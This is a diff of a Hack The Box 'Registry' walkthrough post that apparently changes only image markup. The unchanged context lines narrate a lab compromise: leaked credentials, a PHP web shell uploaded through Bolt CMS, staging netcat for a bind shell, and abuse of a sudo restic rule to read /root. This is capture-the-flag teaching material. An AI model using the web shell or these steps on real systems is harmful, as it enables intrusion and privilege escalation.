@@ -119,9 +119,8 @@ X-Content-Type-Options: nosniff
 
 Seem like this registry is hosting a repository for the Bolt CMS docker image. How's how the site,  `/bolt` looks like.
 
-<a class="image-popup">
-![c12f044f.png](/assets/images/posts/registry-htb-walkthrough/c12f044f.png)
-</a>
+{% include image.html image_alt="c12f044f.png" image_src="/assets/images/posts/registry-htb-walkthrough/c12f044f.png" %}
+
 
 Let's list out the tags.
 
@@ -222,29 +221,25 @@ sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
 
 I found the SSH key pair of `bolt`.
 
-<a class="image-popup">
-![1f298100.png](/assets/images/posts/registry-htb-walkthrough/1f298100.png)
-</a>
+{% include image.html image_alt="1f298100.png" image_src="/assets/images/posts/registry-htb-walkthrough/1f298100.png" %}
+
 
 And the password (`GkOcz221Ftb3ugog`) to unlock the private key.
 
-<a class="image-popup">
-![0191d3ac.png](/assets/images/posts/registry-htb-walkthrough/0191d3ac.png)
-</a>
+{% include image.html image_alt="0191d3ac.png" image_src="/assets/images/posts/registry-htb-walkthrough/0191d3ac.png" %}
+
 
 ## Low-Privilege Shell
 
 Suffice to say, the key pair gave me access to a low-privilege shell as `bolt`, and the file `user.txt `is at `bolt`'s home directory.
 
-<a class="image-popup">
-![f3861115.png](/assets/images/posts/registry-htb-walkthrough/f3861115.png)
-</a>
+{% include image.html image_alt="f3861115.png" image_src="/assets/images/posts/registry-htb-walkthrough/f3861115.png" %}
+
 
 Looks like someone got there before I did. :laughing:
 
-<a class="image-popup">
-![d9f3bbd8.png](/assets/images/posts/registry-htb-walkthrough/d9f3bbd8.png)
-</a>
+{% include image.html image_alt="d9f3bbd8.png" image_src="/assets/images/posts/registry-htb-walkthrough/d9f3bbd8.png" %}
+
 
 ## Privilege Escalation
 
@@ -255,21 +250,18 @@ During enumeration of `bolt`'s account, I notice that that I can read the SQLite
 # sqlite3 bolt.db
 ```
 
-<a class="image-popup">
-![5e25a2fd.png](/assets/images/posts/registry-htb-walkthrough/5e25a2fd.png)
-</a>
+{% include image.html image_alt="5e25a2fd.png" image_src="/assets/images/posts/registry-htb-walkthrough/5e25a2fd.png" %}
+
 
 Sending the hash to John the Ripper reveals the password (`strawbery`).
 
-<a class="image-popup">
-![b6f7539f.png](/assets/images/posts/registry-htb-walkthrough/b6f7539f.png)
-</a>
+{% include image.html image_alt="b6f7539f.png" image_src="/assets/images/posts/registry-htb-walkthrough/b6f7539f.png" %}
+
 
 Armed with `admin`'s password, I can log in to the Bolt CMS admin page at `/bolt/bolt`.
 
-<a class="image-popup">
-![0d790da3.png](/assets/images/posts/registry-htb-walkthrough/0d790da3.png)
-</a>
+{% include image.html image_alt="0d790da3.png" image_src="/assets/images/posts/registry-htb-walkthrough/0d790da3.png" %}
+
 
 ### Bolt CMS Admin
 
@@ -279,23 +271,19 @@ One can allow PHP scripts to be uploaded in Bolt CMS by editing the `config.yml`
 <?php echo shell_exec($_GET[0]); ?>
 ```
 
-<a class="image-popup">
-![63ad602d.png](/assets/images/posts/registry-htb-walkthrough/63ad602d.png)
-</a>
+{% include image.html image_alt="63ad602d.png" image_src="/assets/images/posts/registry-htb-walkthrough/63ad602d.png" %}
 
-<a class="image-popup">
-![747b576a.png](/assets/images/posts/registry-htb-walkthrough/747b576a.png)
-</a>
 
-<a class="image-popup">
-![062e2e1e.png](/assets/images/posts/registry-htb-walkthrough/062e2e1e.png)
-</a>
+{% include image.html image_alt="747b576a.png" image_src="/assets/images/posts/registry-htb-walkthrough/747b576a.png" %}
+
+
+{% include image.html image_alt="062e2e1e.png" image_src="/assets/images/posts/registry-htb-walkthrough/062e2e1e.png" %}
+
 
 There you have it. Usually at this point, it's time to get a reverse shell but that's pointless because all outbound traffic is blocked.
 
-<a class="image-popup">
-![df382c3e.png](/assets/images/posts/registry-htb-walkthrough/df382c3e.png)
-</a>
+{% include image.html image_alt="df382c3e.png" image_src="/assets/images/posts/registry-htb-walkthrough/df382c3e.png" %}
+
 
 What now? If a reverse shell is not possible, then we'll try a bind shell. But first, we need the `nc` package with the `-c` and `-e` switches. To do that, let's transfer the `nc` from Kali Linux over to `/tmp` with `scp`.
 
@@ -303,15 +291,13 @@ What now? If a reverse shell is not possible, then we'll try a bind shell. But f
 # scp -i bolt /bin/nc.traditional bolt@10.10.10.159:/tmp/nc
 ```
 
-<a class="image-popup">
-![c5bdf14b.png](/assets/images/posts/registry-htb-walkthrough/c5bdf14b.png)
-</a>
+{% include image.html image_alt="c5bdf14b.png" image_src="/assets/images/posts/registry-htb-walkthrough/c5bdf14b.png" %}
+
 
 Looks like `www-data` has the permission to do something as `root` without password!
 
-<a class="image-popup">
-![695626fc.png](/assets/images/posts/registry-htb-walkthrough/695626fc.png)
-</a>
+{% include image.html image_alt="695626fc.png" image_src="/assets/images/posts/registry-htb-walkthrough/695626fc.png" %}
+
 
 ### Restic Backup
 
@@ -321,9 +307,8 @@ According to the [documentation](https://restic.readthedocs.io/en/latest/010_int
 
 The `sudo` policy seems to be suggesting that we backup to a remote REST server. Recall that all outbound traffic is blocked? Well, we'll just have to set up the REST server locally and have `restic` installed on our machine remotely restore the data instead.
 
-<a class="image-popup">
-![6908582f.png](/assets/images/posts/registry-htb-walkthrough/6908582f.png)
-</a>
+{% include image.html image_alt="6908582f.png" image_src="/assets/images/posts/registry-htb-walkthrough/6908582f.png" %}
+
 
 We'll transfer a copy of [`rest-server`](https://github.com/restic/rest-server) over with `scp`. Good thing that `rest-server` is a statically-linked executable with no external dependencies.
 
@@ -333,9 +318,8 @@ We'll transfer a copy of [`rest-server`](https://github.com/restic/rest-server) 
 
 Next, let's set up a local repository as a remote repository shares the same layout.
 
-<a class="image-popup">
-![5ef72a60.png](/assets/images/posts/registry-htb-walkthrough/5ef72a60.png)
-</a>
+{% include image.html image_alt="5ef72a60.png" image_src="/assets/images/posts/registry-htb-walkthrough/5ef72a60.png" %}
+
 
 Here we can choose any password, just don't forget it. Once that's done, we can set up the REST server.
 
@@ -347,15 +331,13 @@ Here's the local REST server is listening at `8888/tcp` and the path is pointing
 
 Time to backup `/root` as `root`!
 
-<a class="image-popup">
-![ce96f344.png](/assets/images/posts/registry-htb-walkthrough/ce96f344.png)
-</a>
+{% include image.html image_alt="ce96f344.png" image_src="/assets/images/posts/registry-htb-walkthrough/ce96f344.png" %}
+
 
 On my machine, I can dump `root.txt` from the latest snapshot.
 
-<a class="image-popup">
-![1ecffee2.png](/assets/images/posts/registry-htb-walkthrough/1ecffee2.png)
-</a>
+{% include image.html image_alt="1ecffee2.png" image_src="/assets/images/posts/registry-htb-walkthrough/1ecffee2.png" %}
+
 
 :dancer:
 
